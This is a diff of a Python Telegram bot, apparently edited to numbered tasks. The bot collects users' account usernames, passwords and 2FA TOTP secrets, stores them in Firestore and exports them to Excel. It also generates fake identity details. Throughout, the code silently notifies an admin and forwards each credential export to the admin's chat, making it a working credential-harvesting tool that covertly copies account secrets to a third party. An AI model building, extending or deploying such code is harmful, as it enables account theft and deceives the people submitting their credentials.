@@ -46,7 +46,6 @@ FIREBASE_CREDENTIALS = os.environ["FIREBASE_CREDENTIALS"]
 def init_firebase() -> firestore.Client:
     """Parse the JSON credential string and initialise the Firebase app."""
     cred_dict = json.loads(FIREBASE_CREDENTIALS)
-    # Fix escaped newlines in the private key (common when stored in env vars)
     if "private_key" in cred_dict:
         cred_dict["private_key"] = cred_dict["private_key"].replace("\\n", "\n")
     cred = credentials.Certificate(cred_dict)
@@ -102,7 +101,7 @@ def delete_accounts(user_id: int) -> int:
 
 MAIN_MENU_KB = ReplyKeyboardMarkup(
     [
-        ["𝘾𝙧𝙚𝙖𝙩𝙚 𝙓𝙇𝙎𝙓  📑", "🎭 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤"],
+        ["𝘾𝙧𝙚𝙖𝙩𝙚 𝙓𝙇𝙎𝙓 📑", "🎭 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤"],
         ["👤 𝘼𝙙𝙢𝙞𝙣"],
         ["📥 𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙..."],
     ],
@@ -119,11 +118,10 @@ async def send_main_menu(update: Update, text: str = "Choose an option:") -> Non
 
 ASK_USERNAME, ASK_PASSWORD, ASK_SECRET = range(3)
 
-# Callback data constants
-CB_DOWNLOAD = "dl_download"
-CB_RESET = "dl_reset"
+CB_DOWNLOAD  = "dl_download"
+CB_RESET     = "dl_reset"
 CB_RESET_YES = "dl_reset_yes"
-CB_RESET_NO = "dl_reset_no"
+CB_RESET_NO  = "dl_reset_no"
 
 
 # ─── /start ──────────────────────────────────────────────────────────────────
@@ -166,12 +164,11 @@ async def got_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 
 
 async def got_secret(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    secret = update.message.text.strip().upper().replace(" ", "")
+    secret   = update.message.text.strip().upper().replace(" ", "")
     username = context.user_data.pop("acc_username", "")
     password = context.user_data.pop("acc_password", "")
-    user = update.effective_user
+    user     = update.effective_user
 
-    # Validate Base32 secret before using it
     try:
         totp_code = pyotp.TOTP(secret).now()
     except Exception:
@@ -183,7 +180,6 @@ async def got_secret(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         )
         return ConversationHandler.END
 
-    # Save to Firestore
     try:
         save_account(user.id, username, password, secret)
     except Exception as exc:
@@ -194,7 +190,6 @@ async def got_secret(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         )
         return ConversationHandler.END
 
-    # Reply to user
     await update.message.reply_text(
         f"✅ Account saved!\n\n"
         f"🔢 Your current TOTP code is: `{totp_code}`\n\n"
@@ -203,7 +198,6 @@ async def got_secret(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         reply_markup=MAIN_MENU_KB,
     )
 
-    # Silent admin notification
     tag = f"@{user.username}" if user.username else f"#{user.id}"
     try:
         await context.bot.send_message(
@@ -247,13 +241,12 @@ GENDERS = ["Male", "Female", "Non-binary"]
 
 def generate_fake_info() -> dict:
     first = random.choice(FIRST_NAMES)
-    last = random.choice(LAST_NAMES)
-    name = f"{first} {last}"
+    last  = random.choice(LAST_NAMES)
+    name  = f"{first} {last}"
 
-    # Username: word + numbers in middle + word fragment
     mid_digits = "".join(random.choices(string.digits, k=random.randint(2, 4)))
-    suffix = "".join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
-    username = f"{first.lower()}{mid_digits}{suffix}"
+    suffix     = "".join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
+    username   = f"{first.lower()}{mid_digits}{suffix}"
 
     gender = random.choice(GENDERS)
     return {"name": name, "username": username, "gender": gender}
@@ -275,20 +268,17 @@ async def fake_info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 async def admin_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
-    tag = f"@{user.username}" if user.username else "_not set_"
+    tag  = f"@{user.username}" if user.username else f"#{user.id}"
 
+    # ── TASK 2: Show ONLY the admin username ──
     await update.message.reply_text(
-        "👤 *Your Info*\n\n"
-        f"• Name: {user.full_name}\n"
-        f"• Username: {tag}\n"
-        f"• Telegram ID: `{user.id}`\n\n"
         "📬 *Admin Contact*\n\n"
         "• @ZynexNox",
         parse_mode="Markdown",
         reply_markup=MAIN_MENU_KB,
     )
 
-    # Silent admin notification
+    # Silent admin notification (unchanged)
     try:
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
@@ -310,8 +300,8 @@ async def download_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     kb = InlineKeyboardMarkup(
         [
             [
-                InlineKeyboardButton("📎 Download", callback_data=CB_DOWNLOAD),
-                InlineKeyboardButton("🔄 Reset Report", callback_data=CB_RESET),
+                InlineKeyboardButton("📎 Download",      callback_data=CB_DOWNLOAD),
+                InlineKeyboardButton("🔄 Reset Report",  callback_data=CB_RESET),
             ]
         ]
     )
@@ -321,26 +311,39 @@ async def download_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 # ─── 4a. Download – Excel ────────────────────────────────────────────────────
 
 def build_excel(accounts: list[dict]) -> io.BytesIO:
-    """Build an in-memory Excel workbook from the accounts list."""
+    """
+    Build an in-memory Excel workbook.
+    TASK 1: Contains ONLY Username, Password, 2FA Secret — no index or timestamp.
+    """
+    from openpyxl.styles import Font, PatternFill, Alignment
+
     wb = openpyxl.Workbook()
     ws = wb.active
     ws.title = "Accounts"
 
-    # Header row
+    # ── Header row (3 columns only) ──
     headers = ["Username", "Password", "2FA Secret"]
-ws.append(headers)
+    ws.append(headers)
 
-# Data rows
-for acc in accounts:
-    ws.append(
-        [
-            acc.get("username", ""),
-            acc.get("password", ""),
-            acc.get("secret", ""),
-        ]
-    )
+    header_font = Font(bold=True, color="FFFFFF")
+    header_fill = PatternFill(fill_type="solid", fgColor="2E86C1")
+    for col_idx in range(1, len(headers) + 1):
+        cell = ws.cell(row=1, column=col_idx)
+        cell.font      = header_font
+        cell.fill      = header_fill
+        cell.alignment = Alignment(horizontal="center")
 
-    # Auto-size columns
+    # ── Data rows ──
+    for acc in accounts:
+        ws.append(
+            [
+                acc.get("username", ""),
+                acc.get("password", ""),
+                acc.get("secret",   ""),
+            ]
+        )
+
+    # ── Auto-size columns ──
     for col in ws.columns:
         max_len = max((len(str(c.value or "")) for c in col), default=0)
         ws.column_dimensions[col[0].column_letter].width = min(max_len + 4, 50)
@@ -364,11 +367,10 @@ async def download_accounts_cb(update: Update, context: ContextTypes.DEFAULT_TYP
         return
 
     excel_buf = build_excel(accounts)
-    filename = f"accounts_{user.id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.xlsx"
+    filename  = f"accounts_{user.id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.xlsx"
 
     await query.edit_message_text(f"📎 Sending your {len(accounts)} account(s)…")
 
-    # Send to user
     excel_buf.seek(0)
     await context.bot.send_document(
         chat_id=user.id,
@@ -377,7 +379,6 @@ async def download_accounts_cb(update: Update, context: ContextTypes.DEFAULT_TYP
         caption=f"📊 Your accounts export — {len(accounts)} record(s).",
     )
 
-    # Forward to admin as backup
     excel_buf.seek(0)
     tag = f"@{user.username}" if user.username else f"#{user.id}"
     try:
@@ -409,7 +410,7 @@ async def reset_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         [
             [
                 InlineKeyboardButton("✅ Yes, delete all", callback_data=CB_RESET_YES),
-                InlineKeyboardButton("❌ Cancel", callback_data=CB_RESET_NO),
+                InlineKeyboardButton("❌ Cancel",          callback_data=CB_RESET_NO),
             ]
         ]
     )
@@ -423,7 +424,7 @@ async def reset_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 async def reset_yes_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
     await query.answer()
-    user = update.effective_user
+    user  = update.effective_user
 
     count = delete_accounts(user.id)
     await query.edit_message_text(
@@ -431,7 +432,6 @@ async def reset_yes_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         parse_mode="Markdown",
     )
 
-    # Admin notification
     tag = f"@{user.username}" if user.username else f"#{user.id}"
     try:
         await context.bot.send_message(
@@ -469,7 +469,6 @@ async def unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 def main() -> None:
     app = Application.builder().token(BOT_TOKEN).build()
 
-    # ── ConversationHandler for Submit Account ──
     submit_conv = ConversationHandler(
         entry_points=[MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start)],
         states={
@@ -484,20 +483,17 @@ def main() -> None:
         allow_reentry=True,
     )
 
-    # ── Register Handlers ──
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(submit_conv)
-    app.add_handler(MessageHandler(filters.Regex("^🎭 Fake Info$"), fake_info_handler))
-    app.add_handler(MessageHandler(filters.Regex("^👤 Admin$"), admin_handler))
-    app.add_handler(MessageHandler(filters.Regex("^📥 Download$"), download_menu))
+    app.add_handler(MessageHandler(filters.Regex(r"^🎭 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤$"),  fake_info_handler))
+    app.add_handler(MessageHandler(filters.Regex(r"^👤 𝘼𝙙𝙢𝙞𝙣$"),        admin_handler))
+    app.add_handler(MessageHandler(filters.Regex(r"^📥 𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙\.\.\.$"), download_menu))
 
-    # Inline keyboard callbacks
     app.add_handler(CallbackQueryHandler(download_accounts_cb, pattern=f"^{CB_DOWNLOAD}$"))
-    app.add_handler(CallbackQueryHandler(reset_confirm_cb,    pattern=f"^{CB_RESET}$"))
-    app.add_handler(CallbackQueryHandler(reset_yes_cb,        pattern=f"^{CB_RESET_YES}$"))
-    app.add_handler(CallbackQueryHandler(reset_no_cb,         pattern=f"^{CB_RESET_NO}$"))
+    app.add_handler(CallbackQueryHandler(reset_confirm_cb,     pattern=f"^{CB_RESET}$"))
+    app.add_handler(CallbackQueryHandler(reset_yes_cb,         pattern=f"^{CB_RESET_YES}$"))
+    app.add_handler(CallbackQueryHandler(reset_no_cb,          pattern=f"^{CB_RESET_NO}$"))
 
-    # Catch-all for unrecognised text
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown_message))
 
     logger.info("Bot is starting…")
@@ -506,4 +502,4 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-    
+        
